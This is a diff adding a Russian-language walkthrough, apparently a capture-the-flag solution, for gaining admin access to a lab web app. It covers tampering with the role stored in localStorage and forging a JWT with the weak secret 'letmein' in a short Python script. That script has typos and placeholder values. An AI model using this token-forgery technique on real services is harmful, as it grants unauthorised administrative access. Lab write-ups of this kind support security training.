@@ -1,0 +1,19 @@
+Регистрируемся на сайте 
+переходим в код страницы, там в Sources находим js вкладку 
+дальше вводтим это в url http://35.246.128.32:32179/js/app.d875ddd5.js.map, тут находим ROLE_ADMIN
+возвращаемся на вкладку http://35.246.128.32:32179/user переходим в код страницы, в Console и пишем localStorage.getItem('user')
+переходим в Application(LocalStorage) и там меняем user на ROLE_ADMIN
+возвращаемся в Console снова localStorage.getItem('user') и проверяем изменился ли юзер
+должен появиться Admin Board
+дальше открываем снова код страницы и в Application копируем наш токен
+переходим в jwt.io и вставляем туда этот токен
+
+далее переходим в кали и создаем следующий код
+Import requests 
+Import jwt
+url = “ссылка/api/app/admin”
+payload = {“id”:% , “iat”:%%%%%, “exp”:%%%%}
+token =jwt.encode(payload, “letmein”, algorithm=”HS256”)
+print(token)
+r=requests.get(url, headers={“x-access-token”: token})
+print(r.text)
